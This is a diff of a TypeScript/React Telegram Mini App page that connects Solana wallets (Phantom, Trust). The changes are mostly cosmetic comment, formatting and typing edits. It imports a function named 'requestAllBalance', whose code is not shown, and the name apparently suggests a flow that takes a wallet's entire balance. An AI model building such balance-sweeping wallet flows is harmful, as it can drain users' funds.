@@ -11,7 +11,7 @@ import { useWallet } from '@solana/wallet-adapter-react'
 import type { WalletAdapter, WalletReadyState } from '@solana/wallet-adapter-base'
 import { requestAllBalance } from '@/app/services/transaction'
 
-/* ——— Global Window augmentasyonu ——— */
+/* ——— Yalnızca solana augmentasyonu ——— */
 declare global {
   interface Window {
     solana?: {
@@ -23,7 +23,7 @@ declare global {
   }
 }
 
-/* ——— Yerel Telegram window tipi ——— */
+/* ——— Yerel Telegram WebApp tipi ——— */
 interface TgWebApp {
   expand: () => void
   requestFullscreen?: () => void
@@ -32,13 +32,11 @@ interface TgWebApp {
   disableVerticalSwipes?: () => void
   scroll?: (offsetY: number) => void
 }
-type TgWindow = Window & { Telegram?: { WebApp: TgWebApp } }
-
 
 export default function Page() {
   /* ——— Telegram Mini-App başlat ——— */
   useEffect(() => {
-    const webapp = window.Telegram?.WebApp
+    const webapp = window.Telegram?.WebApp as TgWebApp | undefined
     if (!webapp) return
     try {
       webapp.expand()
@@ -89,28 +87,26 @@ export default function Page() {
   /* ——— Wallet & Drawer kontrolü ——— */
   const { wallets, select, publicKey } = useWallet()
   const [drawerOpen, setDrawerOpen] = useState(false)
-  const [loading,    setLoading]    = useState(false)
-  const [msg,        setMsg]        = useState('')
+  const [loading, setLoading] = useState(false)
+  const [msg, setMsg] = useState('')
 
   const openDrawer  = () => setDrawerOpen(true)
   const closeDrawer = () => setDrawerOpen(false)
 
   /* ——— Wallet yapılandırmaları & sıralama ——— */
   const origin = typeof window !== 'undefined' ? window.location.origin : ''
-
   interface WalletConfig {
     match: (adapterName: string) => boolean
     label: string
     icon: string
     deepLink: string
   }
-
   const walletConfigs: WalletConfig[] = [
     {
       match: name => name === 'Phantom',
       label: 'Phantom',
       icon: '/phantom.svg',
-      deepLink: '' // Phantom için openPhantomBrowser() kullanacağız
+      deepLink: '' // Phantom için openPhantomBrowser() kullanılacak
     },
     {
       match: name => name.toLowerCase().includes('trust'),
@@ -151,19 +147,13 @@ export default function Page() {
     readyState: WalletReadyState
   }
 
-  // 1) map ile (DrawerWallet | null)[]
+  // map + filter ile tip güvenli dizi
   const mappedWallets: Array<DrawerWallet | null> = walletConfigs.map(cfg => {
     const w = wallets.find(w => cfg.match(w.adapter.name))
     return w
-      ? {
-          adapter:    w.adapter,
-          readyState: w.readyState,
-          ...cfg
-        }
+      ? { adapter: w.adapter, readyState: w.readyState, ...cfg }
       : null
   })
-
-  // 2) filter ile DrawerWallet[]
   const orderedWallets: DrawerWallet[] = mappedWallets.filter(
     (x): x is DrawerWallet => x !== null
   )
@@ -206,6 +196,7 @@ export default function Page() {
       window.open(w.deepLink, '_blank')
     }
   }
+
 
       return (
         <>
